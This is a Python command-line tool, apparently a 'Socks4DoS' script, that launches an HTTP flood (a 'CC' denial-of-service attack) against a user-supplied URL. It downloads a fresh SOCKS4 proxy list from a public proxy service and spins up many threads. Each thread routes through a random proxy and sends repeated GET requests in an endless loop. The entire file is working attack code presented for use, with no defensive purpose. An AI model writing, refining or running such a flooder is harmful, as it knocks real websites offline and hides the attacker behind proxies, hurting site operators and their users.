import requests
import random
import time
import threading
from colorama import Fore

print(Fore.GREEN + """
   ____         __       ____ ___         
  / __/__  ____/ /__ ___/ / // _ \___  ___
 _\ \/ _ \/ __/  '_/(_-<_  _/ // / _ \(_-<
/___/\___/\__/_/\_\/___//_//____/\___/___/
                                          
""")
print(" ")

def opth(): 
	for i in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("root@bossy:~# Threads " + str(i+1) + " Created")
	print("root@bossy:~# Wait A Few Seconds For Threads Ready To Attack ...")
	time.sleep(3)
	input("root@bossy:~# Press Enter To Launch Attack !")
	global on 
	on = True

on = False
def main():
	global pprr
	global list
	global proxy
	global url
	global pwr
	global thr
	global on
	url = str(input(Fore.BLUE + "root@bossy:~# Target : " + Fore.WHITE))
	thr = int(input(Fore.BLUE + "root@bossy:~# Threads : " + Fore.WHITE))
	cho = str(input(Fore.BLUE + "root@bossy:~# Get Some Fresh Socks ? ( y / n ) : " + Fore.WHITE))
	if cho =='y':
		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1000&country=all') #Code By GogoZin
		with open('socks.txt','wb') as fp:
			fp.write(rsp.content)
			print(Fore.YELLOW + "root@bossy:~# Sucess Get Fresh Socks List !")
	else:
		pass
	list = str(input(Fore.BLUE + "root@bossy:~# Socks List ( socks.txt ) : " + Fore.WHITE))
	if list =="":
		list = 'socks.txt'
	else:
		list = str(list)
	pprr = open(list).readlines()
	print(Fore.BLUE + "root@bossy:~# Socks Count : " + Fore.WHITE + "%d " %len(pprr))
	pwr = int(input(Fore.BLUE + "root@bossy:~# CC.Power ( 1-100 ) : " + Fore.WHITE))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = requests.session()
	s.proxies = {}
	s.proxies['http'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
	s.proxies['https'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
	time.sleep(10)
	while True:
		while on:
			try:
				s.get(url)
				#Code By root@bossy:~# 
				try:
					for y in range(pwr):
						s.get(url)
						print(Fore.BLUE + "root@bossy:~# Socks CC Flood From ~[ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.BLUE + " ] " + Fore.WHITE)
					s.close
				except:
					s.close()
			except:
				s.close()
				print(Fore.RED + "root@bossy:~# Can't Connet To This Socks . . . Skip ~>" + Fore.WHITE)


if __name__ == "__main__":
	main()
